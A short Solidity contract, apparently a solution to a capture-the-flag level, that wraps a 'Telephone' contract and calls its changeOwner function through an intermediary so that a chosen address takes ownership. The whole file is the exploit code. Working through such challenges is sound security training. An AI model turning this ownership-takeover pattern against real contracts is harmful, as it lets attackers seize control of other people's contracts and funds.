// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./tel.sol";

contract caller{
    Telephone tel;

    constructor(address _address) public{
        tel=Telephone(_address);
    }

    function cambiaOwner(address _address) public{
        tel.changeOwner(_address);
    }
}